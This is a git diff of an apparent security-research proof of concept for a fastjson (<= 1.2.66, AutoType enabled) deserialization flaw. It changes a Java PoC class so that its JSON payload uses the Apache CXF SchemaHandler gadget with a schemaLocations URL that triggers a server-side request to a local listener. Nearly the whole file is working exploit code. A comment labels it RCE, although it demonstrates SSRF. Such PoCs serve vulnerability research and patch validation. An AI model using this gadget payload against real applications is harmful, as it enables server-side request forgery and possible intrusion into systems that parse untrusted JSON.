@@ -1,11 +1,11 @@
-package com.threedr3am.bug.fastjson;
+package com.threedr3am.bug.fastjson.ssrf;
 
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.parser.ParserConfig;
 import com.threedr3am.bug.common.server.HTTPServer;
 
 /**
- * fastjson <= 1.2.66 RCE，需要开启AutoType
+ * fastjson <= 1.2.66 RCE，需要开启AutoType (Discovered by threedr3am) 水
  *
  *
  * <dependency>
@@ -21,7 +21,7 @@ import com.threedr3am.bug.common.server.HTTPServer;
  *
  * @author threedr3am
  */
-public class ApacheCxfSSRFPoc {
+public class ApacheCxfSSRFPoc2 {
 
   static {
     HTTPServer.PORT = 23234;
@@ -30,7 +30,7 @@ public class ApacheCxfSSRFPoc {
 
   public static void main(String[] args) {
     ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
-    String payload = "{\"@type\":\"org.apache.cxf.jaxrs.model.wadl.WadlGenerator\",\"schemaLocations\": \"http://127.0.0.1:23234?a=1&b=22222\"}";
+    String payload = "{\"@type\":\"org.apache.cxf.jaxrs.utils.schemas.SchemaHandler\",\"schemaLocations\": \"http://127.0.0.1:23234?a=1&b=22222\"}";
     try {
       JSON.parse(payload);
     } catch (Exception e) {
